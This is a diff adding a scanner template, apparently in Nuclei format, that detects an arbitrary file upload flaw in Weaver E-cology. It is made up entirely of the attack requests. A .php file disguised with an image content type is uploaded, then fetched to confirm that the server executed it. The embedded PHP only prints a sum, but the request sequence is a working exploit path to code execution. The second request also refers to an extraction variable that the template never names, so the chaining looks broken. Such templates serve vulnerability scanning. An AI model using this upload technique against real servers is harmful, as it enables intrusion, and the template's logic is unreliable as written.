@@ -1,0 +1,45 @@
+id: poc-yaml-weaver-e-cology-uploadfile
+info:
+  name: Weaver E-cology Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,e-cology
+http:
+  - raw:
+      - |
+        POST /Upload/upload_file.php?l=test HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+        Content-Type: multipart/form-data; boundary=--------------------------boundary
+
+        ----------------------------boundary
+        Content-Disposition: form-data; name="file"; filename="test_{{rand_base(5)}}.php"
+        Content-Type: image/avif
+
+        <?php echo (31123124214+123123124);?>
+        ----------------------------boundary--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test_"
+    extractors:
+      - type: regex
+        internal: true
+        part: body
+        regex:
+          - "test_([a-zA-Z0-9]{5}\\.php)"
+  - raw:
+      - |
+        GET /Upload/test/{{extra_extract_0}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "31246247338"
